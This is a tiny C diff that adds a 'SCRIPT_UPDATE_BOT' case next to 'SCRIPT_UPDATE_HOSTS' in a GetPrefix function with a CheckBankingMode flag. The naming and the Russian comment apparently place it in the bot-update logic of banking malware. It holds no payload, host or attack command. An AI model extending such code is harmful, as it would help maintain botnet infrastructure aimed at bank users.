@@ -265,6 +265,7 @@ char *GetPrefix(bool CheckBankingMode)
 
 			// ссылки из массива обновлений
 			case SCRIPT_UPDATE_HOSTS: Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 7, 9, 7, 9);
+			case SCRIPT_UPDATE_BOT:   Exts = (PCHAR*)&UpdateScriptsExts[0]; RANGE(false, 10, 12, 10, 12);
 		default:
 			return NULL;
 		}
